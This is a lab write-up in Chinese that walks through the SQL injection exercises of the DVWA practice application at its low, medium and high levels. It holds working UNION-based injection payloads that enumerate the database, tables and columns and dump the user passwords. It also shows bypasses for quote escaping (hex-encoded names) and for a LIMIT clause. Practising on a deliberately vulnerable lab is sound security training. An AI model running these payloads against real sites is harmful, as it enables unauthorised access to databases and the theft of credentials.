1. low
首先判断类型是数字型还是字符型输入'1 and 1=1 报错说明不是数字型 ------原理就是字符型需要闭合引号，数字型加入引号会破坏sql从而报错
然后确定列数使用**order by:**payload：'order by 3 -- -  和  'order by 2 -- - 猜出为2 原理就是order by 两端列数必须一致否则报错
再看回显 **union select:** 'union select 1,2 -- -
库名**database():**' union select database(),2 -- -  
**return:**dvwa
表名**table_name:**-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()-- - 
**return:**group_concat的目的是把返回的内容弄整齐  如果只想返回users可以加一个 limit 1，1  《limit使用》内容 limit 开始位置，取几个。应该是这样
            users
字段**column_name:**-1' union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'  -- -    **return:**user_id,first_name,last_name,user,password,avatar,last_login,failed_login

出错一次：：users没加引号  会导致没被识别成表名 从而找不到这张表
最后数据**-1'union select 1,group_concat(user_id,password) from users -- -
结束

2. medium
这次没有输入框了 我们需要用到抓包---我使用了**burp suite**
找到id 参数然后开始判断注入类型 1 and 1=1 和1 and 1=2 看结果 发现第一条返回内容第二条无内容 说明数字型然流程全都一样

1 order by 3 -- -报错 1 order by 2 -- -不报错  2列

1 union select 1,2 -- -都是回显位置

1 union select 1,database()-- -  
  **return:** dvwa
-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#   
  **return:**guestbook,users 
-1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users' #
报错：判断为什么会报错 **内容是:**You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '\'users\' #\r\n' at line 1**明显**它告诉你单引号被转义了  那你怎么自己判断单引号被转义？？
' and 1=1  和' and 1=2    若两个payload 返回内容一模一样那就是被转义了    
**solution:**此时你可以使用十六进制 'users'=0x7573657273
-1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273 #
**return:**user_id,first_name,last_name,user,password,avatar,last_login,failed_login
-1 union select 1,group_concat(user_id,password) from users -- -
结束

3. High
这次又是新玩法 它让我点链接 然后输入id 点了之后弹出一个新界面
依旧先判断类型
输入1 and 1=1 页面无变化 
输入1 and 1=2 页面也无变化        
输入'         页面报错       以上可得**explain:**字符型
列数和之前一样所以直接复制了
1 order by 3 -- -报错 1 order by 2 -- -不报错  2列
直接在页面上看
这次payload变了  多了一个1=2  因为后台有limit 1  它只取第一个数据 就是原用户的数据 所以我们需要加入1=2(永远为假)所以返回是空 所以理所当然返回你的内容
 1' and 1=2 union select 1,2#  
 1' and 1=2 union select 1,database()-- -  
  **return:** dvwa
-1' and 1=2 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#   
  **return:**guestbook,users 
-1' and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users' #
  **return:**user_id,first_name,last_name,user,password,avatar,last_login,failed_login
-1' and 1=2 union select 1,group_concat(user_id,password) from users -- -

这个难度主要是在后端加了一个**limit 1**返回第一个数据
那么怎么判断加了**limit**??
我们可以使用这个payload: **1' or 1=1#**它可以返回所有用户  如果只返回一个 说明加了limit 1
总体来说这个难度还是不高。
